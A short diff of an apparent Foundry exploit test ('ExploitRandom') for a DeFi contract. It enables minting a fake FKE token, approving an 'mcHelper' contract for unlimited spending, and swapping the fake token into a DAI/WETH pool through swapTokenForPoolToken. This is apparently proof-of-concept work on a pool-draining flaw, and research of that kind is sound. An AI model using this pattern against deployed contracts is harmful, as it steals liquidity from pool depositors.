@@ -132,8 +132,8 @@ contract ExploitRandom is Test {
         logPair(wethFkeLpTkn);
         logPair(daiFkeLpTkn);
 
-        // FKE.mint(address(this), 10e18);
-        // FKE.approve(address(mcHelper), type(uint256).max);
+        FKE.mint(address(this), 10e18);
+        FKE.approve(address(mcHelper), type(uint256).max);
 
         // logPair(wethFkeLpTkn);
         // logPair(usdcFkeLpTkn);
@@ -141,7 +141,7 @@ contract ExploitRandom is Test {
         // console2.log("WETH mcHelper balance %s: ", WETH.balanceOf(address(mcHelper)));
         // logPair(IUniswapV2Pair(address(daiWethLpTkn)));
 
-        // mcHelper.swapTokenForPoolToken(poolIdUsdcWeth, address(FKE), 10e18, 0);
+        mcHelper.swapTokenForPoolToken(poolIdDaiWeth, address(FKE), 1e18, 0);
 
         // console2.log("###############################################");
         // console2.log("###############################################");
